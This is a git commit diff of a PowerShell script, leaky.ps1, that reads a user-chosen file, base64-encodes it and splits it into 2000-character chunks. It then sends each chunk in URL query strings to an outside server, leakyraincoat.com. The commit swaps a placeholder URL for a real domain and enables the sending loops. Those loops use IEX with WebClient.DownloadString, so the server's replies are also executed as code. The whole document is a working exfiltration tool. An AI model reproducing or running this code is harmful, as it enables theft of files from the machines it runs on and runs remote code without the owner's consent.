fdd52d6ccb3bf5e58c292b3d6290ca54829c20ec
pand0rausa <pand0ra.usa@gmail.com>
2017-02-21 16:38:51 -0700

    Update leaky.ps1

--- leaky.ps1
+++ leaky.ps1
@@ -8,14 +8,23 @@ Function Get-FileName($initialDirectory)
     $OpenFileDialog.filename
 }
 
-$ResultURL = "http://<url>/psh.php?y="                     # Destination URL
+$ResultURL = "http://leakyraincoat.com/psh.php?x="                     # Destination URL
 $inputfile = Get-FileName "C:\temp"                                    # Open dialog to select file to send
 $FileContent = [IO.File]::ReadAllBytes($inputfile);                    # Read file
-$encoded = [Convert]::ToBase64String($FileContent).TrimStart("`/"," ") # Convert to base64
+#$encoded = [Convert]::ToBase64String($FileContent).TrimStart("`/"," ") # Convert to base64
+$encoded = [Convert]::ToBase64String($FileContent) # Convert to base64
 #Write-Host ($ResultURL + $encoded)
+Write-Host $encoded
 [System.Collections.ArrayList]$split = @([regex]::split($encoded, '(.{2000})') -replace('\s+','`r`n'))    # Break into array each only 2000 character chunks (URL is limited to 2083 characters)
 $newLine = $split | ? {$_}                                                                                
 #Write-Host $newLine[4]
 
-#for ($counter = 0; $counter -lt $newLine.Count; $counter++) {Write-Host ($ResultURL +$newLine[$counter] + "&name=Test.txt")}           
+if ($fileContent.Length -lt 2000)  
+{for ($counter = 0; $counter -lt $newLine.Count; $counter++) {IEX(New-Object System.Net.WebClient).DownloadString($ResultURL + $newLine + "&name=test.txt")}
+for ($counter = 0; $counter -lt $newLine.Count; $counter++) {Write-Host ($ResultURL +$newLine + "&name=test.txt")}
+}
+
+else {
+for ($counter = 0; $counter -lt $newLine.Count; $counter++) {Write-Host ($ResultURL +$newLine[$counter] + "&name=test.txt")}           
 for ($counter = 0; $counter -lt $newLine.Count; $counter++) {IEX(New-Object System.Net.WebClient).DownloadString($ResultURL + $newLine[$counter] + "&name=test.txt")}    # Append each array entry to URL and send
+}
